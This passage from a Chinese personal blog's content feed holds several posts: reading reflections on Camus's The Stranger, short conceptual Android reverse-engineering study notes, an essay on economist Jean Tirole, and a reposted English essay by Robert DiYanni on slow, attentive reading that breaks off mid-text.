<p>我知道朋友是为了我好，但是下次别人再给我推什么东西，我一定要自己研究清楚，不能冲动了。并且我要接受自己是单线程这个事实，不能太贪心，必须一件事一件事搞好。高估了自己。</p>
<p>就当花钱买教训吧。</p>
<p><em><strong>可是有时候意外也会让人前功尽弃。</strong></em></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>积累</category>
      </categories>
      <tags>
        <tag>碎片化阅读</tag>
      </tags>
  </entry>
  <entry>
    <title>《局外人》感悟</title>
    <url>/2022/04/03/%E3%80%8A%E5%B1%80%E5%A4%96%E4%BA%BA%E3%80%8B%E6%84%9F%E6%82%9F/</url>
    <content><![CDATA[<p>​        今天是2022.1.28日。读完《局外人》，用了半天的时间，也是在几天前了，原本是打算读完就写这篇文章，但是一直拖到现在。我没有写读后感的习惯，这是不好的。读后感有助于对获取知识的梳理，对领悟的深层次观察，因此，我也得养成这个习惯比较好。</p>
<p>为了方便描述，采用第一人称手法。</p>
<p>​        局外人这本书，大概的故事情节是这样的：最开始，我的母亲在我送她去的养老院去世，我去收拾母亲的身后事，过程中，也遇到了许多人，经历了一些事情。（主角的表现不同于以往人们的悲伤，或许是对自己母亲没什么感情，也可能是本来性子就冷，也可能是其他原因）然后是回到自己的住所，描述了我与邻居之间的一些事情，然后也遇到了自己之前认识的一个女人（我忘了叫什么了），期间，我在母亲去世还不太久的这段时间，和那个女人去看了电影，甚至发生了关系，与一位老人邻居，关于他狗的事情，进行了交谈，其实在读者的我的视角看来，是老人单方面的输出话语，书中的我单方面的聆听这些讯息。另一位邻居的事情要更复杂一些，他被一位妇人所欺骗，最后妇人的丈夫找上门，然后我的这位邻居报复了妇人。之后我和这位邻居出去度假，在度假途中，我失手杀了这位跟踪我邻居的丈夫。我被逮捕，检察官找了我接触的所有证人，来说明我应当被判死刑。最后我被执行死刑。</p>
<p>​        在整本书中，从最开始，我察觉到主角的情感不明显，没有太大的悲伤开始，我就在纳闷，为什么作者会这样写，我甚至带着一些电视剧的通俗套路去想这本书在后边章节会不会有转折什么，这本书比较短，所以读到中间本分，我就突然意识到了“局外人”三个字与故事情节的关系，我也逐渐猜到了故事的结尾。其实，身在社会，是真的身不由己的，故事的主人公，并没有随波逐流，而是随着随性，但这与大众所指定的规则是不同的，因此他是一定会遭到社会的谴责。但，谁又能说的定，这个社会到底是怎么样呢。我很倾佩主人公的随性，就算最后被判死刑，他也是没有太大感觉的。反过来说，是我比较可悲，初中时期的我，也是主人公一样的不与世俗计较，但总归是年少，也不懂这么多道理，总归是选择了妥协，在不知不觉中，就开始改变自己，融入社会。也不是不好，至少现在的我，与人相处和谐，大家都比较喜欢和我交朋友。但是有时候想起来，还是有些可惜和累的，只不过，不喜欢的事情做多了，也会成为一种习惯，累也不是肢体的累，只是一种怀念而已。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>扩展读物</category>
      </categories>
      <tags>
        <tag>日常阅读</tag>
      </tags>
  </entry>
  <entry>
    <title>android reverse</title>
    <url>/2022/03/18/android-reverse/</url>
    <content><![CDATA[<p><strong>如何判断apk文件是32还是64：</strong></p>
<p>ARM 32位对应的是armv7架构、armv6架构、armv5架构</p>
<p>ARM 64位是armv8架构</p>
<p>常用的abi:</p>
<p>armeabi: armv5架构和armv6架构 （32位）</p>
<p>armeabi-v7a:armv7架构 （32位）</p>
<p>armeabi-v8a:armv8架构 （64位）</p>
<p>x86:x86架构 （32位）</p>
<p>x86_<em>64:x86</em>_64架构 （64位）</p>
<p><strong>签名：</strong></p>
<p>签名的算法一般用消息摘要算法（不可逆）</p>
<p>md5、、、</p>
<p>签名的源数据一半来自于数据包</p>
<p>签名之前对源数据进行排序，头尾可能会有固定字符串</p>
<p><strong>零散：</strong></p>
<p>看到<code>StringBuilder</code>要找<code>toString</code>：输出的地方</p>
<p>log输出、匿名管道、smali插桩</p>
<p><strong>smali插桩：</strong>大概就是调试代码，插入代码，打印出想看到的东西</p>
<p>最主要的是理清它的加密思路，适当记录</p>
<p>做算法逆向分析的时候，要结合流量包来看是否可逆验证</p>
<p>**Hook:**顾名思义，就是“钩子”，也称作“钩子技术”，其原理是先将需要修改的函数“钩住”，然后使用自定义的函数替换原函数，让程序在运行时执行自定义函数，从而达到动态修改软件的目的。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>安卓逆向</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>408题型总结</title>
    <url>/2021/10/16/408%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="DS"><a href="#DS" class="headerlink" title="DS"></a>DS</h1><p><img src="https://ckcah.github.io/images/408/image-20211016185916712.png" alt="image-20211016185916712.png"></p>
<h1 id="CO"><a href="#CO" class="headerlink" title="CO"></a>CO</h1><h1 id="CN"><a href="#CN" class="headerlink" title="CN"></a>CN</h1><h1 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h1><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>真题总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>经济学里的“梯若尔现象”</title>
    <url>/2021/08/16/%E7%BB%8F%E6%B5%8E%E5%AD%A6%E9%87%8C%E7%9A%84%E2%80%9C%E6%A2%AF%E8%8B%A5%E5%B0%94%E7%8E%B0%E8%B1%A1%E2%80%9D/</url>
    <content><![CDATA[<p><em><strong>keyword：本文原载于《经济学家茶座》2016年第2期（总第72辑）。</strong></em></p>
<p>让·梯若尔（Jean Tirole）教授生于1953年，1978年获得应用数学博士学位，1981年获得经济学博士学位。他一直担任名满欧洲、享誉世界的法国图卢兹大学产业经济研究所（IDEI）的科研所长（Scientific Director），同时在多家大学担任兼职教授。根据百度百科的介绍，他是2014年诺贝尔经济学奖获得者，在全世界所有经济学家中排名第二。</p>
<p>我们可以从IDEI网页上下载到梯若尔教授的学术简历。他的英文简历是2015年9月更新的，从这份简历里我们可以看到，他共发表了180多篇英语论文（包括期刊论文和书的章节）和40多篇法语论文，出版了10余部专著，可以说是极其高产，用一个成语来形容就是“著作等身”。</p>
<p>在这里，笔者想要探讨的是梯若尔教授为什么能够取得如此巨大的学术成功，其学术成功背后的原因究竟有哪些。网上有一句广为流传的励志名言讲得非常好，“成功的人是跟别人学习经验，失败的人只跟自己学习经验。”毫无疑问，梯若尔教授的经验是值得广大经济学研习者学习的。</p>
<p>从梯若尔教授1981年开始发表第一篇论文算起，不看法语论文，单看英语论文，他平均每年大概发表5篇高质量的英语论文。从他1985年开始出版第一部著作算起，他平均大概每年写130页。这些耀眼的数字还不是最关键的，最关键的是他的论著质量奇高。</p>
<p>用北京大学国家发展研究院教授汪浩的话来说就是，“有人可能觉得这些数字看起来并非高不可攀，但是考虑到论文和专著的质量，其代表的成就的确令人叹为观止。”根据某知名学术搜索的统计，我们可以发现，他撰写的《产业组织理论》（The Theory of Industrial Organization）一书被引用14000多次，《公司金融理论》（The Theory of Corporate Finance）一书被引用1900多次。他与让-雅克·拉丰（Jean-Jacques Laffont）合著的《政府采购与规制中的激励理论》（A Theory of Incentives in Procurement and Regulation）一书被引用5300多次，合著的《电信竞争》（Competition in telecommunications）一书被引用1400多次。</p>
<p>他发表的论文中被引用2000次以上的有4篇，被引用1000次以上2000次以下的有10余篇，其他被引用几百次的论文还有一大批，我们就不在这里一一列举。</p>
<p>梯若尔教授是起先读的是应用数学博士，后面读的是经济学博士，他的受教育背景跟绝大多数的经济学者不一样。从本质上看，梯若尔教授本身就代表了一种新的经济学培养模式，这种培养模式跟传统的培养模式有很大的不同。</p>
<p>传统的培养模式是按部就班地从经济学学士到经济学硕士再到经济学博士，也就是所谓的经济学科班出身。当然，我们在这里不是要否定和批评传统的经济学培养模式，传统的经济学培养模式也出了很多“快手”，比如其中最为著名的麻省理工学院（MIT）的达龙·阿塞莫格鲁（Daron Acemoglu）教授。</p>
<p>笔者在《经济学家茶座》2008年第6辑（总第38辑）曾经发表过一篇题目为《经济学里的“阿塞莫格鲁现象”》的文章，其中写到，“阿塞莫格鲁博士是有很强的代表性的，他并没有像梯若尔（Tirole）和拉丰（Lafont）那样取得数学博士学位之后又取得经济学博士学位，即使是‘骑着数学的快马在经济学的沙场上征跑’也并不是因为自己具有数学上的先天优势。”</p>
<p>没想到仅在该文发表六年之后，梯若尔教授就斩获了诺贝尔经济学奖，如果拉丰教授还健在的话，估计很有可能会跟梯若尔教授一起分享该年度的诺贝尔经济学奖。笔者对“阿塞莫格鲁现象”进行解读时，指出了阿塞莫格鲁博士学术成功背后的四点原因：</p>
<p>第一，经济学的基本功要特别扎实；第二，能够转换研究领域，并且能够在自己的研究领域里进行深度挖掘；第三，善于寻找和自己知识互补的学者进行合作研究；第四，具有健康的体魄和充沛的体力。作为《经济学里的“阿塞莫格鲁现象”》的姊妹篇，本文在解读“梯若尔现象”时，当然不能“穿新鞋走老路”，而是要从梯若尔教授自身的现实条件出发，看看他是如何在他自身的约束下实现学术最大化的。下面就让笔者分四点进行阐述。</p>
<p>事先声明一下，这四点只是笔者基于梯若尔教授目前已经取得的学术成就的解读，不同的学者可能会有不同的解读，所谓“仁者见仁，智者见智”。如果你认同笔者的解读，可以从中借鉴一些对自己有益的东西；如果你不认同笔者的解读，你自己也可以提出一些替代性的解读。</p>
<p>第一点就是，要善于运用自己的比较优势。学术市场就像产品市场，论文和著作就是产品，作者就是生产者，生产者只有遵循比较优势才能在市场中立足。经济学者在进行研究时，要清楚自己的比较优势之所在，不能拿自己的短项跟别人的长项比拼，否则很可能事倍功半、出力不讨好。</p>
<p>对经济学研究者而言，不管是谁，要想取得学术上的成功，都需要把自己的比较优势发挥到极致。梯若尔教授的比较优势就是他的深厚数学功力以及基于数学功力的对经济学思想理解上的超强穿透力。梯若尔教授在写作的过程中充分利用了自身的比较优势。</p>
<p>打个比方，如果你拥有传说中的倚天剑或屠龙刀，你不能把倚天剑或屠龙刀“束之高阁”，你要想方设法让倚天剑或屠龙刀成为自己的有效武器，最好是常备武器而不是秘密武器。梯若尔教授就像中国人所熟知的白眉大侠徐良一样，也做到了刀、剑、招和人合而为一。</p>
<p>他的180多篇英语论文和10余部著作，基本上都是带有数学模型的理论分析，这一点跟许多功成名就的经济学家在后期喜欢写纯文字性的经济学论文有很大的区别。数学模型就是梯若尔教授的刀和剑，把数学模型和经济学思想结合起来就是梯若尔教授的招。正是凭借着他的刀、剑和招，梯若尔教授才成为经济学里的“学术英雄”。</p>
<p>第二点就是，要善于用“新瓶装旧酒”。在汉语中，“新瓶装旧酒”用来比喻用新的形式表现旧的内容。有很多人先是读了数学的博士，然后再转读经济学的博士，为什么偏偏梯若尔教授能成为这些人中的佼佼者呢？要知道，数学很好的人在进行经济学研究时容易剑走偏锋，陷入非主流。</p>
<p>梯若尔教授在写论文的过程中，不是先从边缘非主流领域做起，而是先从传统主流领域做起，在传统主流领域的基础上向外扩张，绝大多数时候他手里拿着的刀和剑始终就是他所擅长的博弈论和合约理论。大家可以看看他写的论文的主题，基本上围绕企业、政府、银行和市场展开，当然论文要在这些大的话题（topic）下面找一个小的问题（question），而对小点的捕捉则依赖于其基于数学功力的对经济学思想的超强领悟力。</p>
<p>当然，老酒也有可能会发生新变化，比如，有一部分会变成有香味的乙酸乙酯。老的主题里面也可能会有新的现象发生，梯若尔教授也非常善于捕捉这些老主题中的新现象，他的一些论文的研究对象实际上是针对新现象的。“新瓶装旧酒”中的“旧酒”正是这些传统主流领域以及这些传统主流领域所发生的现象。</p>
<p>说得夸张一点，这些传统的主流领域就像爱情、婚姻和家庭一样是人类永恒的主题，在这些永恒的主题上搞出的突破很有可能是重大突破，至少是容易被大家认可的突破。这种“新瓶装旧酒”可以保证梯若尔教授始终行走在主流经济学的大道上。由于梯若尔教授具有我们在第一点中所讲的数学工具上的比较优势，所以他在这些传统主流领域形成了“摧枯拉朽之势”。</p>
<p>第三点就是，要善于选择有效的合作方式。梯若尔教授发表的180多篇英语论文中，大概有30篇是独立完成的，其他都是跟合作者一起共同完成的，合作的成果大概占到85%，可以说绝大多数论文都是合作的。</p>
<p>这一方面说明，当今的经济学学术研究已经慢慢从单打独斗的时代转变到合作共赢的时代，就是像梯若尔教授这样的学术大牛也概莫能外。另一方面也说明，梯若尔教授确实在合作方面做得比较好，领会和践行了合作之道。</p>
<p>合作里面大有学问，这一点尤其值得国内经济学者借鉴。阿塞莫格鲁教授比较善于跟自己知识互补的学者进行合作，梯若尔教授则比较善于跟自己有共同知识结构的学者进行合作。跟自己知识互补的学者进行合作，有利于现有任务的安排和当前研究的完成。跟自己知识结构相同的学者进行合作更容易碰撞出思想的火花，有利于新思想的产生，为写下一篇论文做好铺垫。两种方式各有自己的长处。</p>
<p>第一种方式可以实现远距离、跨区域合作，交流不需要那么频繁，只需要把任务布置下来就可以了。第二种方式需要比较多的接触和交流，合作过程中新思想源源不断的产生可能会导致合作伙伴比较稳定、合作时间比较长久。</p>
<p>梯若尔教授和合作伙伴大都比较稳定和长久，譬如，他和他的导师埃里克·马斯金（Eric Maskin）合作发表了一大批论文，他和朱·弗登博格（Drew Fudenberg）合作发表了一大批论文，他和让-雅克·拉丰合作发表了一大批论文，他和马赛厄斯·德瓦特里庞合作发表了一大批论文，他和本特·霍姆斯特姆（Bengt Holmström）合作发表了一大批论文，他和菲利普·阿吉翁（Philippe Aghion）也合作发表了一些论文。</p>
<p>这些合作者都是诺贝尔经济学奖级别的，有的已经获得了诺贝尔经济学奖，有的将来很有可能获得诺贝尔经济学奖，有的有实力获得诺贝尔经济学奖但却不幸英年早逝。梯若尔教授对合作方式的选择，很值得那些数学功力比较强的经济学者借鉴。</p>
<p>第四点就是，要有比较强的执行力。微观经济学里有一句非常著名的话是，“选择是已经显示的偏好。”对这句话稍做改编，用在梯若尔教授身上就是，“结果是已经显示的行动。”梯若尔教授的学术发表记录那么优秀，说明他平时就很刻苦，他平时的执行力就很强。</p>
<p>人都是有惰性的，都喜欢拖延。诺贝尔经济学奖获得者乔治·阿克洛夫（George Akerlof）教授曾经在《美国经济评论》1991年第81卷第2期上发表过一篇题目为《拖延与服从》（Procrastination and Obedience）的论文，在这篇论文中他基于亲身经历建立一个模型，阐明了拖延的内在机制和危害。很多人把拖延（Procrastination）翻译成拖延症，对付这个症的良药就是提高执行力。</p>
<p>在写作论文的过程中，要根据时间情况安排自己的进程，争取做到“今日事，今日毕”，不要因为偷懒而把事情拖延到明天。我国古代有一首非常著名的《明日歌》，里面有几句是这么写的，“明日复明日，明日何其多。我生待明日，万事成蹉跎。”笔者认为，梯若尔教授的速度是跟他的执行力强分不开的。</p>
<p>要知道，论文发表是“一连串的事情”，从构思到建模到写成初稿到不断修改到投稿，中间任何一个环节拖延，都会导致论文发表的拖延。提高执行力，应该成为每个经济学研究者的习惯，好习惯才能带来学术成功，好习惯才能成就美好学术人生。</p>
<p>“梯若尔现象”并不像“阿塞莫格鲁现象”那样具有普遍的借鉴意义，因为很多研究者都是通过传统模式或者接近于传统模式培养出来的，如果硬要照搬梯若尔教授的研究模式，很容易“邯郸学步”。笔者觉得，其中第四点相对而言具有更加普遍的借鉴意义，第一点、第二点和第三点要从精神实质上进行借鉴。</p>
<p>最后，笔者来说一下梯若尔教授对经济学特别是组织经济学的影响。我们在用博弈论或者合约理论来分析组织问题时，很多时候都是在无形之中借鉴了梯若尔教授的方法，可能无形到我们根本就不会在参考文献中列出梯若尔的文献，因为这些东西早已内化到我们的内心深处了，我们甚至忘记了这实际上是梯若尔意义上的（in the sense of Tirole）。</p>
<p>这种影响就如同莱昂内尔·罗宾斯（Lionel Robbins）教授所著的《经济科学的性质和意义》对我们的经济学方法带来的影响一样，我们已经分不清是罗宾斯的还是我们自己的。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>扩展读物</category>
      </categories>
      <tags>
        <tag>日常阅读</tag>
      </tags>
  </entry>
  <entry>
    <title>关于区块链和信息安全以及网络安全</title>
    <url>/2021/08/12/%E5%85%B3%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E5%92%8C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BB%A5%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<p>关于区块链，是我最新发现的，其实也正好作为新的研究方向，我的渗透有点不想搞了。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>自我探索</category>
        <category>网络安全</category>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>区块链</tag>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title>How to gain more from your reading</title>
    <url>/2021/08/07/How-to-gain-more-from-your-reading/</url>
    <content><![CDATA[<p> <strong>keyword：这是一位学者的原文，我只是互联网的搬运工</strong></p>
<p>There’s more to words than meets the eye. Deepen your appreciation of literature through the art of slow, attentive reading</p>
<p>by Robert DiYanni</p>
<p><em>Still life with Book</em> (detail, 1913) Juan Gris. <em>Courtesy Musée d’Art Moderne de la Ville de Paris, Paris, France</em></p>
<p>Robert DiYanniis a professor of humanities at New York University. His latest books are <a href="https://www.wiley.com/en-us/Critical+Reading+Across+the+Curriculum%3A+Humanities%2C+Volume+1-p-9781119154891"><em>Critical Reading Across the Curriculum</em></a> (2017), co-written with Anton Borst, and <a href="https://press.princeton.edu/books/hardcover/9780691206783/you-are-what-you-read"><em>You Are What You Read: A Practical Guide to Reading Well</em></a> (2021). He lives in Bedford, New York.</p>
<h2 id="Need-to-know"><a href="#Need-to-know" class="headerlink" title="Need to know"></a>Need to know</h2><p>Have you ever wondered how some people see so much in what they read – whether they’re reading novels or stories, poems or plays, essays or memoirs, or something entirely different? One of the pleasures of reading literature well is the satisfaction of being tuned in to what a literary work shows and suggests – and to how it does those things. You probably already enjoy the ways that literary works entertain you, instruct you, move you. Recognising and understanding how they accomplish these things will enable you to deepen your appreciation still further and gain even more reward.</p>
<p>From reading deeply, you gain experience as well as knowledge: you gain from reading literary works in all their unique particularity. You live other lives, undergo other ways of being in the world that, while differing from your own, speak, nonetheless, to your condition and that of the people around you. In the process of reading literature, we therefore enrich our understanding of other people and of the world – and of ourselves. We become, in some sense, what we read.</p>
<p>You might wonder how to increase your enjoyment of literary works, how you might amplify literature’s value, and savour more fully the pleasures of language and form, of idea and insight that works of literature offer. In the following villanelle, I suggest how you might begin.</p>
<blockquote>
<p><strong>The Art of Reading</strong></p>
</blockquote>
<blockquote>
<p>The art of reading isn’t hard to master,<br>some say. But I say <em>au contraire</em>; not so.<br>It is no small achievement to read well,</p>
</blockquote>
<blockquote>
<p>with intense absorption in the text.<br>It requires attention and discernment.<br>The art of reading takes effort to master.</p>
</blockquote>
<blockquote>
<p>It requires reading many kinds of works,<br>some easy, some more difficult.<br>To read good books and read them truly well</p>
</blockquote>
<blockquote>
<p>with skill and confidence, with ease and grace<br>deepens understanding, makes one wise.<br>To learn the art of reading – to become a master –</p>
</blockquote>
<blockquote>
<p>read widely and deeply, re-read and read aloud,<br>make observations, ask questions of what you read.<br>It’s no small gain to read supremely well.</p>
</blockquote>
<blockquote>
<p>It’s a skill for lifelong learning pleasure.<br>Read for fun as well as learning – for delight.<br>The art of reading takes some time to master,<br>in pixels or in print. Go slow. Enjoy. Read well.</p>
</blockquote>
<p>NEED TO KNOWWHAT TO DOKEY POINTSLEARN MORELINKS &amp; BOOKS</p>
<h2 id="What-to-do"><a href="#What-to-do" class="headerlink" title="What to do"></a>What to do</h2><p>To reap the benefits of reading literature with greater pleasure and appreciation, here are some of the most important things you can do:</p>
<p><strong>Pay close attention and question what you’re reading</strong></p>
<p>Reading with insight and toward deeper understanding requires paying close attention, noticing as much as you can about the text from the beginning. Attending to a work carefully will prepare you to reflect on it, engage with it and ask questions. That’s the key – bring to bear your attentive, observant, questioning self on your reading.</p>
<p>Consider the opening sentence of Leo Tolstoy’s great novel <em>Anna Karenina</em> (1877), in its acclaimed 2000 translation by Richard Pevear and Larissa Volokhonsky: ‘All happy families are alike; each unhappy family is unhappy in its own way.’</p>
<p>What you might notice about this sentence first, perhaps, is its parallel structure. Tolstoy’s line balances and contrasts happy families with unhappy ones. It asserts that they differ in how they experience happiness and unhappiness.</p>
<p>OK. So that’s what Tolstoy posits as he launches his 800-page novel. He sets up an early expectation that his book will be about families, some happy and some unhappy. We need to read the book, of course, to find out what their happiness and unhappiness consists of, and how they became happy and unhappy families along the way.</p>
<p>In reflecting on Tolstoy’s sentence, your thinking might take the form of questioning its assertion. You might qualify it, or perhaps hold in abeyance your agreement or disagreement. You might even imagine a reversal of what the sentence says, revising it this way: ‘All unhappy families are alike; each happy family is happy in its own way.’ Your careful observations about Tolstoy’s sentence will lead to questions, which will lead to reflection, which illustrates how you can engage actively with a writer’s work.</p>
<p><strong>Read, and then read again</strong></p>
<p>Reading with understanding, appreciation and pleasure requires <em>re-reading</em>. Why is this so? Re-reading is critical because there are so many things going on in a work of literature that you can’t grasp them all in a single reading – no one can. You need time to notice and reflect; to revisit and re-see what’s there, to ensure that what you observed in your preliminary excursion through an essay or poem or story is indeed there. And you need an opportunity to see what you might have missed. In your second and subsequent traversals of a work, you’ll notice more, question more, think more, understand more, and in the process deepen your reading pleasure.</p>
<p>Consider this brief two-line poem by Robert Frost:</p>
<blockquote>
<p><strong>The Span of Life (1936)</strong></p>
</blockquote>
<blockquote>
<p>The old dog barks backward without getting up.<br>I can remember when he was a pup.</p>
</blockquote>
<p>What do you notice on a quick first reading of these lines? Perhaps that they rhyme; Frost’s poem is a couplet. Next, that the poem describes a dog; in the present, an old dog. Seeing his ageing canine companion, the speaker remembers when he was a little pup. That’s it. There’s nothing more to it. Right?</p>
<p>Well, not exactly – though that’s the gist of what the poem shows us. But what if you looked more carefully; what if you were to reflect a little on what the poem might be suggesting. Noticing involves listening as well as looking, so try to hear the poem in your inner ear. In addition to rhyme, you will hear a metrical beat, a rhythm to the words in each line. You hear and feel the slow motion of the first line, as the first five syllables are all stressed. You hear the first line moving with difficulty while the second line skips along. And though the second line looks shorter than the first visually, it contains only one less syllable.</p>
<p>What might you make of these observations? You might ask yourself why the poet stresses heavily the words in the first line about the old dog, why he uses words with syllables that are hard to pronounce, and why he uses words and syllables that are easy to pronounce in the second line about the young pup. You might attend more carefully to the description of the old dog having difficulty getting up – barking ‘backward’ (a visual image). Doing so, you might notice the contrast between that difficult action and his movements as a pup. That youthful image is not given us by the poet, but it’s implied so that we might imagine it.</p>
<p>Finally, what do you notice about the poem’s title, ‘The Span of Life’? Has Frost given us in two brief lines an image and example of a life span – the life span of his dog? Yes, of course. But he gives us something more as well: he invites us to consider not just <em>a</em> span of life – the dog’s – but <em>the</em> span of life, which includes the span of life of the poem’s human speaker. After all, the speaker has aged, too, along with his dog. And though the dog ages faster, the speaker ages as well – ‘I can remember,’ he says. And so do we, especially if we have seen our own pets age and other people age, including ourselves.</p>
<p>In looking at and listening to Frost’s little poem together, we’ve been making observations about its words and sounds and images. And we’ve been raising questions about its meaning and significance. Those observations and questions lead us to see how these two aspects of writing are connected. As the English poet Alexander Pope wrote in 1711: ‘The sound must seem an echo to the sense.’</p>
<p><strong>Read more slowly</strong></p>
<p>Another way to deepen your appreciation and pleasure in literature is to <em>slow down</em>. You will benefit from a slow reading of longer, more ambitious works, just as you did with ‘The Span of Life’. Take your time with them. There’s no rush to finish; and there should be no rush to interpretation either. Take time to enjoy the way the writer presents his or her thinking, to reflect on what a work is saying to you, to mull over the insights you glean and to enjoy the writer’s craft and art.</p>
<p>When I’m reading something of interest and value, I will often limit myself to one chapter a day, for example, or perhaps 20 or 30 minutes of reading time followed by five or 10 minutes to think, reflect and jot notes and questions. Novels I love I read this way. An example: when I read George Eliot’s <em>Middlemarch</em> (1871-72), after a long day’s work, I allotted myself one hour per evening, late at night just before bedtime. In so doing, I lived in that 19th-century milieu for more than a month, soaking up and savouring the book’s country village atmosphere. Taking my time allowed me to digest Eliot’s psychological analysis of her characters, to revel in her complex plotting and her philosophical provocations to thinking. A little at a time. Easy as you go. Stretch out your reading pleasure.</p>
<p>In Henry David Thoreau’s <em>Walden</em> (1854), a book that profoundly influenced Mahatma Gandhi, we’re advised to read ‘deliberately’ – weighing and considering what we read. Thoreau suggests that we give to our reading of a work the same kind and degree of care that the author took in writing it, which in the case of <em>Walden</em> was seven drafts over nine years. ‘Books,’ he writes, ‘must be read as deliberately and reservedly as they were written.’ Now, I’m not suggesting you take nine years to read <em>Walden</em>. I am advocating, however, that you give such a finely crafted book the attention it deserves for both its content and its style. For example, consider this well-known sentence from Thoreau’s book, both for what it says and how it says it: ‘If a man does not keep pace with his companions, perhaps it is because he hears a different drummer. Let him step to the music which he hears, however measured or far away.’ Now that’s a provocative idea about individualism, couched in a pair of elegantly crafted sentences; they march to their own stately rhythm, and their beauty makes Thoreau’s idea memorable.</p>
<p><strong>Read aloud</strong></p>
<p>Yet another way to heighten your reading appreciation and understanding is to <em>read some parts of the text aloud</em> – a sentence or even an entire page. Reading Thoreau’s sentence aloud, for example, will help you notice things you’re likely to miss during silent reading. The ear (and voice) prompt the eye to see, absorb more of the writer’s craft and art. The art of reading and the craft of writing owe as much to the ear as to the eye. Before I invite you to read aloud a paragraph of prose fiction, I encourage you to return to Frost’s ‘The Span of Life’ and to read its two lines aloud. Why? Because I want you to feel in your body – in your mouth especially – as you speak the words aloud, how hard it is to speak the first line: ‘The old dog barks backward without getting up.’ Did you feel your tongue against your palate enunciating the Ds and Gs and hard CK sounds? Did you feel the stress on the first five syllables, and the sentence speed up afterwards?</p>
<p>Now feel in your mouth and on your lips and tongue how easily you can speak its second line: ‘I can remember when he was a pup.’ We form the consonants in this line with our lips. And for the R and W and ‘he’, we simply blow air through our mouths to pronounce. Hard versus easy. Old dog. Young pup. So re-read and read aloud for greater insight and pleasure.</p>
<p>Let’s now take up the prose example I promised you. The following paragraph concludes ‘The Dead’, the final story in <em>Dubliners</em> (1914), a collection of linked short stories by James Joyce:</p>
<blockquote>
<p>Yes, the newspapers were right: snow was general all over Ireland. It was falling on every part of the dark central plain, on the treeless hills, falling softly upon the Bog of Allen and, farther westward, softly falling into the dark mutinous Shannon waves. It was falling, too, upon every part of the lonely churchyard where Michael Furey lay buried. It lay thickly drifted on the crooked crosses and headstones, on the spears of the little gate, on the barren thorns. His soul swooned slowly as he heard the snow falling faintly through the universe and faintly falling, like the descent of their last end, upon all the living and the dead.</p>
</blockquote>
<p>Joyce’s description of the snow falling throughout Ireland is exquisite, a lyrical prose poem. I have shared this ending with hundreds of students, always inevitably succumbing, myself, to its sheer beauty of sound and rhythm. I hope you enjoyed the experience of reading the paragraph aloud – feeling its steady rhythm, hearing its repetition of ‘falling’, its echoing alliterations in ‘crooked crosses’ and ‘soul swooned slowly’, and Joyce’s nifty shift with the snow, first ‘falling softly’ and ‘softly falling’, and then ‘falling faintly and ‘faintly falling’.</p>
